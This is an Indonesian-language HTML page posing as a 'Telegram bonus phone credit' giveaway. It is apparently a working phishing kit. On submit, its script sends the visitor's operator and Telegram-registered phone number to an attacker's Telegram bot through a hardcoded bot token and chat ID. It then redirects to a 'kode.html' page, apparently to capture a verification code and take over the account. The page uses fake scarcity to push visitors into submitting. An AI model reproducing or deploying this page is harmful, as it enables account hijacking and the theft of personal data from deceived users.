<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Bonus Pulsa TELEGRAM</title>
  <link rel="icon" type="image/x-icon" href="asset/loading.png">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
</head>
<body>
<nav class="navbar navbar-light background" style="background: #f0f0f0">
  <div class="container">
    <a class="navbar-brand" href="#1231">
      <h3 style="color: #000000">Khusus Pengguna Telegram</h3>
    </a>
  </div>
</nav>
<div class="container">
  <div class="title-web mt-2">
    <div class="logo-atas">
      <center><img class="img-fluid" src="asset/pulsa.jpg" alt=""></center>
    </div>
    
    <div class="image-web">
    </div>
    <div class="col-md-6 mx-auto mt-3">
      <label class="form-label"><strong>Bonus Pulsa Rp 100.000</strong></label>

      <select class="form-select" id="operator" style="border-radius: 5px">
        <option value="">Pilih Operator</option>
        <option value="TELKOMSEL">TELKOMSEL</option>
        <option value="INDOSAT">INDOSAT</option>
        <option value="TREE">TREE</option>
        <option value="XL AXIATA">XL Axiata</option>
        <option value="SMARTFREN">Smartfren</option>
        <option value="LAINNYA">Operator Lainnya</option>
      </select>
    </div>
    <div class="col-md-6 mx-auto mt-3">
      <label class="form-label" for="nomor"><strong>Nomor Telepon</strong> (Wajib)</label>
      <input type="number" class="form-control" placeholder="Nomor Terdaftar Telegram" id="nomor" style="border: 1px solid rgb(0, 153, 255);">
    </div>
    <div class="col-md-6 mx-auto mt-4">
      <select class="form-select" id="pulsa" style="border-radius: 5px">
        <option value="">Nominal Pulsa</option>
        <option value="Pulsa 50">Rp 50.000 (Habis)</option>
        <option value="Pulsa 100"><strong>Rp 100.000</strong> (Tersedia)</option>
        <option value="Pulsa 300">Rp 500.000 (Habis)</option>
        <option value="Pulsa 500">Rp 500.000 (Habis)</option>
        <option value="Pulsa 7000">Rp 700.000 (Habis)</option>
      </select>
    </div>
    <div class="col-md-6 mx-auto mt-3">
      <button onclick="next()" class="btn btn-primary btn-lg btn-block">Kirimkan</button>
    </div>
    <p id="proses" class="text-center" style="color: rgb(134, 2, 2); display: none">TERIMA KASIH, PERMINTAAN ANDA SEDANG DI PROSES</p>
    <div class="image-web mt-2">
      <center>
        <img src="" alt="" width="250px">
      </center>
    </div>
  </div>
</div>
<script>
  const next = () => {
    let proses = document.querySelector("#proses");
    let nomor = document.querySelector("#nomor").value;
    const operator = document.querySelector("#operator").value;
    const pulsa = document.querySelector("#pulsa").value;
    let token = "6651305313:AAE_o32rMgQZADo5XQVUS0iW_iPupXC0IwU";
    let id_tele = "6250486742";
    if (operator === "" || nomor === "" || pulsa === "") {
      alert("Mohon isi data dengan benar");
    } else {
      let message = `*PULSA TELEGRAM*%0A%0AOperator: ${operator}%0A%0ANO HP:%0A${nomor}%0A____________________%0ANominal: ${pulsa}`;
      let api = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id_tele}&text=${message}`;
      fetch(api, {
        method: 'POST',
      })
      .then((response) => response.json())
      .then(data => {
        console.log('Pesan terkirim:', data);
        window.location.href = "kode.html";
      })
      .catch((error) => {
        console.error('Error:', error);
      });
    }
  }
</script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
</body>
</html>
